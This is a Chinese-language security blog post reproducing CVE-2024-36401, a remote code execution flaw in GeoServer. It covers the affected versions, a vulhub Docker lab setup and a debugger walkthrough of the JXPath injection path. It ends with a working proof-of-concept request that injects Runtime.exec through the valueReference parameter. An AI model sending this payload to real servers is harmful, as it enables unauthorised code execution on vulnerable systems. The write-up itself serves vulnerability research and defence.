<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8" />
<meta name="description" content="功不唐捐" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CVE-2024-36401 GeoServer 代码执行漏洞 | MTCZ91</title>
<link rel="shortcut icon" href="https://mtcz91.github.io/favicon.ico?v=1722123615452">
<link rel="stylesheet" href="https://mtcz91.github.io/styles/main.css">


  <link rel="canonical" href="https://mtcz91.github.io/post/cve-2024-36401-geoserver-dai-ma-zhi-xing-lou-dong/" />
  <meta name="socialText" content="" />
  <meta name="description" content="本文首发于 t00ls
漏洞描述
​	GeoServer 是一个地理空间数据开源服务器软件，在调用GeoTools库 API 解析特性类型的属性/属性名称时，若将攻击者恶意构造的属性名传递给commons-jxpath组件并作为XPath表..." />
  <meta name="referrer" content="always" />
  
  <link rel="stylesheet" href="https://mtcz91.github.io/media/css/katex.min.css">
  <script defer src="https://mtcz91.github.io/media/scripts/katex.min.js"></script>
  
  
  <link rel="stylesheet" href="https://mtcz91.github.io/media/css/prism.css">
  
  
    <link rel="preconnect" href="https://cdn.staticfile.org" />
    
  
</head>

<body class="is-preload">
  <!-- Wrapper -->
  <div id="wrapper">

    <!-- Header -->
<header id="header">
  <div class="inner">
    <!-- Logo -->
    <a href="https://mtcz91.github.io" class="logo">
      <span class="symbol"
        ><img
          src="https://mtcz91.github.io/images/avatar.png?v=1722123615452"
          alt=""
        />
      </span>
      <div class="site-title"> MTCZ91 </div>
    </a>

    <!-- Nav -->
    <nav>
      <ul>
        <li><a href="#menu">Menu</a></li>
      </ul>
    </nav>
  </div>
</header>

<!-- Menu -->
<nav id="menu">
  <ul>
    
    
      <li><a href="/" class="menu">
        首页
      </a></li>
      
    
    
      <li><a href="/archives" class="menu">
        归档
      </a></li>
      
    
    
      <li><a href="/tags" class="menu">
        标签
      </a></li>
      
    
    
      <li><a href="/post/about" class="menu">
        关于
      </a></li>
      
    
  </ul>
</nav>

    <!-- Main -->
    <div id="main">
      <div class="inner">
        <div class="post-pagetitle">
          <h1>
            CVE-2024-36401 GeoServer 代码执行漏洞
          </h1>
        </div>
        <div class="post-info">
          <time class="post-time">
            2024-07-08
          </time>
          <span class="read-times">
            5 min read
          </span>
          
          <a href="https://mtcz91.github.io/tag/-RxPGRR5Y/" class="post-tags">
            # 漏洞复现
          </a>
          
        </div>
        
        <img src='https://mtcz91.github.io/post-images/cve-2024-36401-geoserver-dai-ma-zhi-xing-lou-dong.png' class="post-feature" alt="" />
        
        <div class="post-content-wrapper">
          <div class="post-content">
            <p><strong>本文首发于 t00ls</strong></p>
<h2 id="漏洞描述">漏洞描述</h2>
<p>​	GeoServer 是一个地理空间数据开源服务器软件，在调用GeoTools库 API 解析特性类型的属性/属性名称时，若将攻击者恶意构造的属性名传递给commons-jxpath组件并作为XPath表达式解析时，可造成任意代码执行。</p>
<!-- more -->
<h2 id="影响范围">影响范围</h2>
<p>​	GeoServer &lt; 2.23.6</p>
<p>​	2.24.0 &lt;= GeoServer &lt; 2.24.4</p>
<p>​	2.25.0 &lt;= GeoServer &lt; 2.25.2</p>
<h2 id="环境构建">环境构建</h2>
<p>​	使用 vulhub 的 docker-compose.yml 构建，其中 5005 为远程调试端口</p>
<pre><code class="language-yaml">version: '3'
services:
 web:
   image: vulhub/geoserver:2.23.2
   ports:
    - &quot;8080:8080&quot;
    - &quot;5005:5005&quot;
</code></pre>
<p>​	在上述 docker-compose.yml 目录下通过命令启动漏洞容器:</p>
<pre><code>docker-compose up -d 
</code></pre>
<p>​	将容器中 geoserver 应用目录复制到本地：</p>
<pre><code class="language-cmd">docker cp -a 容器ID:/usr/local/geoserver e:/geoserver-test
</code></pre>
<p>​	在 e:/geoserver-test/geoserver 目录右键以 IDEA project 打开，在 IDEA 中geoserver\webapps\geoserver\WEB-INF\lib 目录上右键 Add as Library... ，name为 lib，点击 OK。</p>
<p>​	在 IDEA 的运行配置里选择 Remote 调试，默认5005端口，选择 Use module classpath 为 geoserver 后点击 OK。</p>
<figure data-type="image" tabindex="1"><img src="https://mtcz91.github.io/post-images/1720447976381.png" alt="" loading="lazy"></figure>
<h2 id="漏洞分析">漏洞分析</h2>
<p>​	官方的漏洞通告里列出了漏洞可能存在的位置，WFS的GetFeature、GetPropertyValue、WMS的GetMap、GetFeatureInfo、GetLegendGraphic、WPS的Execute等。</p>
<p>​	以 org.geoserver.wfs.GetPropertyValue 为例进行分析，这时需要找到可以触发进入该类的请求，通过<a href="https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html">官网文档</a>找到如下请求方式。</p>
<p>​	GET请求：</p>
<pre><code class="language-rul">http://example.com/geoserver/wfs?
  service=wfs&amp;
  version=2.0.0&amp;
  request=GetPropertyValue&amp;
  typeNames=topp:states&amp;
  valueReference=the_geom
</code></pre>
<p>​	POST 请求：</p>
<pre><code>&lt;wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'
 valueReference='the_geom'&gt;
  &lt;wfs:Query typeNames='topp:states'/&gt;
&lt;/wfs:GetPropertyValue&gt;
</code></pre>
<p>​	本次分析过程使用如下 GET 请求：</p>
<pre><code>http://127.0.0.1:8080/geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=t00lssss
</code></pre>
<p>​	在 org.geoserver.wfs.GetPropertyValue 中发现解析属性名称的 propertyNameNoIndexes.evaluate() 方法，在此处下断点：</p>
<figure data-type="image" tabindex="2"><img src="https://mtcz91.github.io/post-images/1720448061019.png" alt="" loading="lazy"></figure>
<p>​	跟进 evaluate() 方法，最终执行到 accessor.get()，可以看到 attPath 是可以被控制的参数值，即 valueReference 的值。</p>
<figure data-type="image" tabindex="3"><img src="https://mtcz91.github.io/post-images/1720448068795.png" alt="" loading="lazy"></figure>
<p>​		继续向下执行可以跟进到<code>org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get()</code>  ，属于 GeoTools 的 CVE-2024-36404 <a href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">漏洞通告</a>中7 个可能触发xpath表达式注入的方法之一 ：</p>
<pre><code>org.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)  
org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)  
org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)  
org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class&lt;T\&gt;)  
org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)  
org.geotools.data.complex.expression.MapPropertyAccessorFactory.new PropertyAccessor() {...}.get(Object, String, Class&lt;T\&gt;)  
org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)
</code></pre>
<p>​	可以看到 t00lssss 值被传递给 xpath 参数：</p>
<figure data-type="image" tabindex="4"><img src="https://mtcz91.github.io/post-images/1720448087444.png" alt="" loading="lazy"></figure>
<p>​	跟进 context.iteratePointers() 方法：</p>
<figure data-type="image" tabindex="5"><img src="https://mtcz91.github.io/post-images/1720448094169.png" alt="" loading="lazy"></figure>
<p>​	跟进 this.compileExpression() 方法，这里对 xpath 进行编译：</p>
<figure data-type="image" tabindex="6"><img src="https://mtcz91.github.io/post-images/1720448104630.png" alt="" loading="lazy"></figure>
<p>​	继续执行，然后进入 <code>org.apache.commons.jxpath.ri.compiler.Expression</code>类的<code>iteratePointers</code>方法：</p>
<figure data-type="image" tabindex="7"><img src="https://mtcz91.github.io/post-images/1720448135144.png" alt="" loading="lazy"></figure>
<p>​	此时，会根据返回的编译对象不同，进入相应的 compute 方法：</p>
<figure data-type="image" tabindex="8"><img src="https://mtcz91.github.io/post-images/1720448142362.png" alt="" loading="lazy"></figure>
<p>​	当前 valueReference 值为 t00lssss，进入了 <code>org.apache.commons.jxpath.ri.compiler.LocationPath</code>的 compute 方法</p>
<figure data-type="image" tabindex="9"><img src="https://mtcz91.github.io/post-images/1720448151045.png" alt="" loading="lazy"></figure>
<p>​	如果传入的 valueReference 值为调用 java 方法的表达式，则跳转到<code>org.apache.commons.jxpath.ri.compiler.ExtensionFunction</code>的 compute 方法，再调用 computeValue() 方法，解析表达式，造成任意代码执行，详见漏洞 POC。</p>
<h2 id="漏洞-poc">漏洞 POC</h2>
<p>​	使用下面POC 验证漏洞：</p>
<pre><code>http://127.0.0.1:8080/geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),'touch /tmp/t00ls')
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://mtcz91.github.io/post-images/1720448165796.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="11"><img src="https://mtcz91.github.io/post-images/1720448174389.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://mtcz91.github.io/post-images/1720448183239.png" alt="" loading="lazy"></figure>
<h2 id="参考链接">参考链接</h2>
<ul>
<li>https://avd.aliyun.com/detail?id=AVD-2024-36401</li>
<li>https://tttang.com/archive/1771/</li>
<li>https://forum.butian.net/share/3129</li>
</ul>

          </div>
          <div class="toc-container">
            <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0">漏洞描述</a></li>
<li><a href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4">影响范围</a></li>
<li><a href="#%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA">环境构建</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E-poc">漏洞 POC</a></li>
<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
</ul>
</li>
</ul>

          </div>
        </div>

        <div class="page-count">
          

          
          <!--访问量统计 -->
            阅读量: <span id="twikoo_visitors">0</span>
          
        </div>
      </div>

      <div class="post-pagination inner">
        
        
        <div class="prev-post">
          <div>
            <a href="https://mtcz91.github.io/post/nacos-github-0day-lou-dong/">上一篇</a>
          </div>
        </div>
        
      </div>

    </div>

    <!-- back to top -->
    <button oneclik="topFunction()" id="BackToTop">
      TOP
    </button>

    <div class="post-comment inner">
      <div class="post-comment">
        

  <h2>评论</h2>
  <div id="tcomment"></div>
  <script src="https://cdn.staticfile.org/twikoo/1.6.36/twikoo.all.min.js"></script>
  <script>
    twikoo.init({
      envId: 'https://mtcz91-blog-comment.hf.space', // 腾讯云环境填 envId；Vercel 环境填地址（https://xxx.vercel.app）
      el: '#tcomment', // 容器元素

      region: 'ap-shanghai', // 环境地域，默认为 ap-shanghai，腾讯云环境填 ap-shanghai 或 ap-guangzhou；Vercel 环境不填
      lang: 'zh-cn', // 用于手动设定评论区语言，支持的语言列表 https://github.com/imaegoo/twikoo/blob/main/src/js/utils/i18n/index.js
    
    })
  </script>





      </div>
    </div>

    <!-- Footer -->
    <!-- Footer -->
<footer id="footer">
  <div class="inner">
    <section>
      <h2>Follow</h2>
      <ul class="icons">
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </section>
    <ul class="copyright">
      <li>
        <a href="https://mtcz91.github.io/atom.xml" target="_blank">
          RSS
        </a> 
      </li>
      <li><a href="https://github.com/wherelse/gridea-theme-phantom">Theme Phantom</a></li>
      <li>Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a></li>
      
    </ul>
  </div>
</footer>
  </div>

  <!-- Scripts -->
  <script src="https://mtcz91.github.io/media/scripts/jquery.min.js"></script>
  <script src="https://mtcz91.github.io/media/scripts/browser.min.js"></script>
  <script src="https://mtcz91.github.io/media/scripts/breakpoints.min.js"></script>
  <script src="https://mtcz91.github.io/media/scripts/util.js"></script>
  <script src="https://mtcz91.github.io/media/scripts/main.js"></script>
  
  <script src="https://mtcz91.github.io/media/scripts/prism.js"></script>
  <script>
    Prism.highlightAll();
  </script>
  
  <script>
    post_scroll();
    back_to_top();
  </script>
</body>

</html>